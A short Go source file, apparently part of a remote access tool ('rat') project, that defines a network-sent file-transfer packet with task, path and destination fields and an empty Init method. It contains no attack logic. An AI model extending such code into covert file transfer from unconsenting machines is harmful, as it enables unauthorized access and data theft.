package main

import "rat/shared"

type FilePacket struct {
	Task        shared.FileTask `network:"send"`
	Path        string          `network:"send"`
	Destination string          `network:"send"`
}

func (packet FilePacket) Header() shared.PacketHeader {
	return shared.FileHeader
}

func (packet FilePacket) Init(c *Client) {

}
